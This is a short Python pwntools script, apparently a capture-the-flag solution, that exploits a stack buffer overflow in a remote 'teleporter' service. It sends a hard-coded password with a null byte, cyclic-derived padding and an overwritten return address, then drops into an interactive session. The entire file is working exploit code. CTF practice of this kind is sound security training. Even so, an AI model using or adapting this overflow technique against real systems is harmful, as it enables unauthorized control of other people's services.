#!/usr/bin/python3
from pwn import remote, p64, cyclic_find

p = remote("cybergym.lucideus.in", 1337)

# p = process("./teleporter")
# print(p.recvline())

RIP = p64(0x401254).decode("utf-8")

# raw_input("attach gdb")

padding = "A"*cyclic_find("maacnaac")

p.sendline("Ho1d_4h3_D00r! \x00"+padding+RIP)

p.interactive()
